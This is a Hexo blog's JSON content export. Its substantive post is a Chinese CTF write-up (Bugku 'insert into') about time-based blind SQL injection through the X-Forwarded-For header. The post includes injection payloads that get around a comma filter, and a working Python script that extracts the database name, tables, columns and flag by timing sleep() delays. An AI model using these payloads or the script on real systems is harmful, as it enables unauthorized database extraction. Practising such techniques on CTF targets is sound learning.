{"meta":{"title":"WWW","subtitle":"W'Note","description":"欢迎光临！","author":"ddd_wmr","url":"http://yoursite.com","root":"/"},"pages":[{"title":"about","date":"2019-08-24T00:00:00.000Z","updated":"2019-08-24T06:23:18.091Z","comments":true,"path":"about/index.html","permalink":"http://yoursite.com/about/index.html","excerpt":"","text":"秃头先行者 前排吃瓜人 用Blog来记录我的学习进程 抖抖抖王某人前来报到 これから お世話に んります。 请多多关照呀。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"},{"title":"分类","date":"2019-08-09T10:53:13.000Z","updated":"2019-08-09T03:42:09.052Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"},{"title":"tags","date":"2019-08-24T00:00:00.000Z","updated":"2019-08-24T06:23:11.988Z","comments":true,"path":"tag/index.html","permalink":"http://yoursite.com/tag/index.html","excerpt":"","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"}],"posts":[{"title":"insert int0","slug":"insert-int0","date":"2019-08-24T16:03:15.000Z","updated":"2019-08-24T08:16:36.461Z","comments":true,"path":"2019/08/25/insert-int0/","link":"","permalink":"http://yoursite.com/2019/08/25/insert-int0/","excerpt":"","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"insert into","slug":"insert into","date":"2019-08-24T00:00:00.000Z","updated":"2019-08-24T07:36:16.821Z","comments":true,"path":"2019/08/24/insert into/","link":"","permalink":"http://yoursite.com/2019/08/24/insert into/","excerpt":"","text":"#insert into 观察题目 可以看到注入点应该在http头的x-forwarded-for上 这里还把‘，’过滤了 因为把，过滤了 if是用不了这里用select case when..then..else..end代替substr也用不了 但是可以用 from 1 for 1代替为了节约时间，可以先手工查字段长度这里以database()做示范: x-forwarded-for:1’ and case when(length((select database()))&lt;6) then sleep(3) else 0 end and ‘a 可以看到右下的时间，延时了证明条件成立，最后测出database（）的长度为5，其他数据长度也这样测出来。还是以database()为例，如果单个字符测具体字段：x-forwarded-for:1’ and case when(substr((select database()) from 1 for 1)=’w’) then sleep(3) else 0 end and ‘a 当然转成ascii码用二分法更有效率但为了更加方便 这里写一个脚本 123456789101112131415161718192021222324252627282930!/usr/bin/python-*- coding: UTF-8 -*-import requestsimport stringmystring = string.ascii_letters+string.digits#所有字母和数字的集合url='http://123.206.87.240:8002/web15/'#查库名data = \"127.0.0.1'+(select case when (substring((database()) from {0} for 1)='{1}') then sleep(5) else 1 end) and '1'='1\" #这里的{0}对应的是后面所需要的format里的str[i](str应该是database()) 查出来是web15#查表名data = \"1'+(case when (substring((select group_concat(table_name) from information_schema.tables where table_schema=database()) from {0} for 1)='{1}') then sleep(4) else 1 end) and '1\"#查出来时clineip和flag#查字段名data = \"1'+(case when (substring((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag') from {0} for 1)='{1}') then sleep(4) else 1 end) and '1\"#查出来是 flag#查内容data= \"1'+(case when(substring((select flag from flag) from {0} for 1)='{1}') then sleep(4) else 1 end) and '1 \"flag = ''for i in range(1,6):#之前得到database()长度为5，但由于substr默认从1开始，所以range设置为1-6 (1,2,3,4,5) 如果不想查把长度设置大一点既可以 for j in mystring: try: headers = {'x-forwarded-for':data.format(str(i),j)}#format格式化输出，把查到的str的每一字符依次赋到{0}里去 res = requests.get(url,headers=headers,timeout=3)#一旦延时超过3s，继续向下执行代码 except requests.exceptions.ReadTimeout:#跳到这里执行，得到所求 flag += j print(flag) breakprint('The final flag:'+flag) 由于延时不是很稳定 所以很容易出错 多试几次才能有正确答案flag{cdbf14c9551d5be5612f7bb5d2867853}（最好每次只开一个运行 不然出错概率太大） document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"ctfweb","slug":"ctfweb","permalink":"http://yoursite.com/categories/ctfweb/"}],"tags":[{"name":"bugku","slug":"bugku","permalink":"http://yoursite.com/tags/bugku/"},{"name":"sql注入","slug":"sql注入","permalink":"http://yoursite.com/tags/sql注入/"}]}]}